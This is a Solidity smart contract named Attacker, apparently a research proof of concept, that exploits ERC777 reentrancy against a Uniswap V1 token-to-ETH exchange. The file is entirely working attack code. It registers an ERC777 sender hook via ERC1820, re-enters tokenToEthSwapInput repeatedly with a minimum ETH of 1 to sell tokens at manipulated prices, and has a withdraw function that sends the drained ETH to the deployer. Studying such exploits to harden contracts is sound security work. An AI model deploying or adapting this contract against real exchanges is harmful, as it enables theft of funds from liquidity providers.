pragma solidity ^0.5.0;

import "openzeppelin-solidity/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-solidity/contracts/token/ERC777/IERC777Sender.sol";
import "openzeppelin-solidity/contracts/introspection/IERC1820Registry.sol";

interface UniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract Attacker is IERC777Sender {

    UniswapExchange private _victimExchange;
    IERC20 private _token;

    // Counter to keep track of the number of reentrant calls
    uint256 private _called = 0;

    uint256 private _tokensToSell = 200;
    uint256 private _numberOfSales = 35;

    address payable private _attacker;

    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address exchangeAddress, address tokenAddress) public {
        _victimExchange = UniswapExchange(exchangeAddress);
        _token = IERC20(tokenAddress);
        _attacker = msg.sender;
        // Approve enough tokens to the exchange
        _token.approve(address(_victimExchange), _tokensToSell * _numberOfSales);

        // Register interface in ERC1820 registry
        _erc1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    // ERC777 hook
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        require(msg.sender == address(_token), "Hook can only be called by the token");
        _called += 1;
        if(_called < _numberOfSales) {
            _callExchange();
        }
    }

    // Similar to callExchange, but able to receive parameters for more complex analysis
    function callExchange(uint256 amountOfTokensToSell, uint256 numberOfSales) public {
        _tokensToSell = amountOfTokensToSell;
        _numberOfSales = numberOfSales;
        _callExchange();
    }

    // Attacker will call this function to withdraw the ETH after the attack
    function withdraw() public {
        _attacker.transfer(address(this).balance);
    }

    function _callExchange() private {
        _victimExchange.tokenToEthSwapInput(
            _tokensToSell,
            1, // min_eth
            block.timestamp * 2 // deadline
        );
    }

    // Include fallback so we can receive ETH from exchange
    function () external payable {}
}
